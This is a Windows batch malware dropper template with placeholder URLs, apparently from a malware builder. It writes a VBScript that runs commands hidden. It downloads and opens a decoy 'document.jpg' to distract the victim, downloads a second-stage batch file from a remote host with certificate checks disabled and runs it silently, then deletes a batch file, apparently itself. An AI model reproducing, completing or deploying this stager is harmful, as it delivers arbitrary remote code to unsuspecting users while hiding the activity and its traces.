REM @echo off
echo CreateObject^("Wscript.Shell"^).Run ^& WScript.Arguments^(0^) ^&, 0, False > "%tmp%/inv.vbs"
(echo if not exist "%tmp%/document.jpg" ^(curl -k "{{picUrl}}" -o "%tmp%/document.jpg" ^) & echo "%tmp%/document.jpg") > "%tmp%/settings.bat"
(echo curl -k "{{batUrl}}" -o "%tmp%/c.bat" & echo call "%tmp%/c.bat") > "%tmp%/b.bat"
wscript.exe "%tmp%/inv.vbs" "%tmp%/settings.bat" 
wscript.exe "%tmp%/inv.vbs" "%tmp%/b.bat" 
del %tmp%\{randomBat}.bat